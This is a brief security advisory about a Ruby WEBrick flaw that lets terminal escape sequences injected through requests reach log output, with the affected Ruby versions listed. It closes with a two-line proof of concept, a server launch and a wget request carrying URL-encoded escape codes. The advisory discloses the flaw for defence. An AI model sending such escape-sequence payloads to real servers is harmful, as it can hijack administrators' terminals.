Ruby WEBrick is prone to a command-injection vulnerability because it fails to adequately sanitize user-supplied input in log files.

Attackers can exploit this issue to execute arbitrary commands in a terminal.

Versions *prior to* the following are affected:

Ruby 1.8.6 patchlevel 388
Ruby 1.8.7 patchlevel 249
Ruby 1.9.1 patchlevel 378

The following example is available:

% xterm -e ruby -rwebrick -e 'WEBrick::HTTPServer.new(:Port=>8080).start' &
% wget http://www.example.com:8080/%1b%5d%32%3b%6f%77%6e%65%64%07%0a
